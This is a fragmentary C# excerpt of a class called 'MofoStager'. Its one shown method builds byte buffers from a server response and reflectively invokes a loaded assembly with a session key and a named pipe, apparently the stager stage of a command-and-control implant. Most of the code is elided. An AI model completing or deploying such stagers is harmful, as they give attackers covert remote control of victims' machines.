    ...
    public class MofoStager
    {
        ...
        public void ExecLevel()
        {
            try
            {
                ...
                var FirstBytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, SOMEID));
                ...
                var SeccondBytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, SOMEID));
                ...
                var ThirdBytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, SOMEID));
                ...
                mofoAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { SOMEID, SessKEy, pipe, PipeName });
            }
